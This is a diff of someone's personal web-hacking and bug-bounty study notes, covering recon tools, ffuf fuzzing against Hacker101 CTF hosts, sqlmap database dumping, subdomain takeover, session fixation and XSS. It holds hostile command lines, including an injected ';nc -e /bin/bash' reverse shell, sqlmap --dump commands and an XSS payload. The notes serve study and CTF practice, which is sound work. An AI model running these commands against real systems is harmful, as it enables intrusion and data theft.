@@ -2,12 +2,25 @@ Go to kali
 Go to Downloads/Burpsuite
 run ./burp.sh
 
-
-
-OSWAP tutorials
+Information about system:
+```
+echo $SHELL
+```
 
 
 TODO:
+	OSWAP tutorials 
+	create the bugcrowd account also
+
+
+Learning
+	1. oswap checklist : read the book
+		always check the checklist file
+	2. tryhackme.com : check the vulnerability here
+	3. 
+
+TODO:
+	vulnweb.com # labs
 COmplete after 3 labs:
 	https://portswigger.net/web-security/authentication/password-based
 
@@ -25,12 +38,27 @@ Kali-menu > password profiling worklist
 	httpx
 	gobuster
 	fuff command
+	anew
+	meg or fff # tool for fetching lot of URL and nice to servers
+
+	wayurls
+	waybackurls
+	juicyurls
+	gau
+	nuclie: automate the vulnerability detection template using YAML; There is tons of template on github. e.g. log4j nuclie template, --HEADLESS, TCP/TLS/UDP (networks), File
+	telenet  : advanced usage
 
 	skipfish # test security for vulnerability : check again and describe more
 	awk
 	
+	https://www.youtube.com/watch?v=J-CMAqFwS4c
+	dirsearch ????
+	nslookup 
+	nmap
+	google dork and github dork : google search using site:shopify.com <any-keyword>
 
-
+	viralmaniar/bigbountyRecon (windows only)
+	reconftw github 
 	
 	```
 	gobuster dir -u "https://801792902472a746ea6a94e81c370387.ctf.hacker101.com" -w Downloads/combined_words.txt -t 100 -H 'X-Forwarded-Token:0.0.0.0'
@@ -70,7 +98,7 @@ Kali-menu > password profiling worklist
 		-o filename.txt
 		-of (json|ejson|html,csv)
 
-	e.g.
+	e.g. always use html output
 		[Not working]
 		ffuf -v -w wordlist.txt –mode pitchfork -request req.txt -mr all -fr “No updatable fields supplied” -f filename -of json
 		
@@ -78,9 +106,19 @@ Kali-menu > password profiling worklist
 		ffuf -v -t 400 -w avatar.txt -mode pitchfork -u https://1ff67aa19a5e2e4f4103674ba4b26edb.ctf.hacker101.com/api/v1/user -X PUT -H 'X-Token: 717ef7cb250baaac386db38ad3817e03' -d 'FUZZ=23' -mc all -fr all -mr all  -o result -of csv
 		seq 0 255 > range.txt # Then run ffuf
 
- 		ffuf -w range.txt:FUZZ1 -w range.txt:FUZZ2 -w range.txt:FUZZ3 -w range.txt:FUZZ4  -u https://0bfd51139862b5a11d4fb8d61b7f4465.ctf.hacker101.com/api/v1/secrets  -H "X-Forwarded-For: FUZZ1.FUZZ2.FUZZ3.FUZZ4"  -mode clusterbomb  -v -o results.json -fc 403,404,500
+ 		ffuf -w range.txt:FUZZ1 -w range.txt:FUZZ2 -w range.txt:FUZZ3 -w range.txt:FUZZ4  -u https://0bfd51139862b5a11d4fb8d61b7f4465.ctf.hacker101.com/api/v1/secrets  -H "X-Forwarded-For: FUZZ1.FUZZ2.FUZZ3.FUZZ4"  -mode clusterbomb  -v -of html -o results.html -fc 403,404,500
 
- 
+	e.g of telnet
+		telnet example.com 80
+		GET /
+		\n
+		\n
+	
+
+	grep -hri key | anew | wc
+	grep -Hnri 'dg key' | vi -
+
+	nmap has the lot of option to check bugs, using --script option
 
 	
 	```
@@ -89,6 +127,22 @@ Kali-menu > password profiling worklist
 	awk -F ',' '$1!=3{ print $1, $3}'
 	```
 
+	viralmaniar/bigbountyRecon (can be started from the start of recon but in window)
+	- configuration to get the robot.txt
+	- google dorks
+	- xss and open redirects
+	- apache strut : if it website link contains .strut, .trq or .do then check for vulnerability and check the exploit using google.com
+    	- exploitdb gives use the  exploit payload
+  	- 
+	
+	reconftw [Not working]
+	`./reconftw.sh -d target.com -a`
+
+	exploit database: gives the list of all the bugs of the past
+
+
+
+	
 
 Famous word dict
 https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/combined_words.txt
@@ -108,6 +162,13 @@ ref: Cody’s First Blog CTF
  change verb to see if some other methods are exposed (GET, POST, PUT, DELETE)
 	for POST FORMS: Content-Type: application/x-www-form-urlencoded
 	make sure there is enter at the end of encoding
+ check subdomain if present while doing burp proxy and browsing and not present in subdomain enumeration, this could lead to very standout subdomain
+
+
+### Session token in URL
+- If sensitive information is present in URL param, then attacker can get it using refere method
+- Session Hijacking ???
+- Session fixation: creating the session and then making the user associate this session with his authentication. This happens generally when webapp does not invalidate the existing session while giving associating new session.
 
 
 ### PII (Personal Identifiable Information)
@@ -123,7 +184,18 @@ when request is allowed for only few IPs and blocker for other, hence use some h
 sqlmap "http://example.com/page.php?id=1" --dbs # enumerate databases
 sqlmap -u "http://example.com/page.php?id=1" --D <DB-NAME> --tables # iterate tables names
 sqlmap -u "http://example.com/page.php?id=1" --D <DB-NAME> --dump # iterate tables names
+### Sqlite injection
+Flat files db are used for small db. Some sqlite commands are
+`PRAGMA table_info(<table-name>)`, `.tables`
 
+#### Crack Hash/ password
+crackstation.net 
+
+
+## Reverse shell
+To have bash over nc
+`;nc -e /bin/bash`
+Other ways to have reverseshell is: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 
 ## Cookie Domain Scope
 
@@ -322,6 +394,49 @@ Forced Browser/direct object reference: enumerate values of other user or data
 Priviledged action 
 
 
+## Subdomain takeover
+First study the subdomain takeover
+- ![domain takeover](images/domain-takeover.png)
+- Use github pages hosting and give the default domain name instead of github.io
+- check for the subdomain availablility by visiting and seeing that 404 error or something showing it's not mapped
+- go to github and add custom domain for the repo with the same subdomain to take over
+- https://www.youtube.com/watch?v=ds7GHLXi5dM
+- https://www.hackerone.com/hackerone-community-blog/guide-subdomain-takeovers
+- while reporting, host the html page at random location with secret message to present that you found this issue.
+
+
+#### Important commands  
+```
+dig # to fetch the details of server ip
+dig domain-name @8.8.8.8
+
+```
+https://0xpatrik.com/subdomain-takeover-ns/
+
+### Process why it occurs
+
+  - Domain name (e.g., sub.example.com) uses a CNAME record to another domain (e.g., sub.example.com CNAME anotherdomain.com).
+  - At some point in time, anotherdomain.com expires and is available for registration by anyone.
+  - Since the CNAME record is not deleted from example.com DNS zone, anyone who registers anotherdomain.com has full control over sub.example.com until the DNS record is present.
+
+### Escalation of severity
+- set of base domain cookie from subdomain will make the base domain cookie to be  modified if the base domain has session fixation vulnerability as given in next section
+- CORS resource sharing
+- Oauth whitelisting: The danger here once again is when subdomains have been whitelisted and therefore you can redirect users during the Oauth flow to your subdomain, potentially leaking their Oauth token
+- CSP: This header is particularly useful if one wants to minimise the impact of cross-site scripting. If your subdomain is included in the whitelist, you can use your subdomain to bypass the policy and execute malicious client-side code on the application.
+- clickjacking
+- password managers filling form in subdomain and hence getting the creds
+- 
+
+
+## Session fixation
+The session fixation attack “fixes” an established session on the victim's browser, so the attack starts before the user logs in.
+
+- Session token in the URL argument
+- Session token in a hidden form field
+- Session ID in a cookie
+
+
 ## XSS: Cross site scripting:
 - Reflected
 - Stored
@@ -340,7 +455,7 @@ https://"onmouseover="alert(1)
 
 
 ## PATH traversal
-
+Go to different path traversal payload
 
 ## Shell command execution/Take over
 
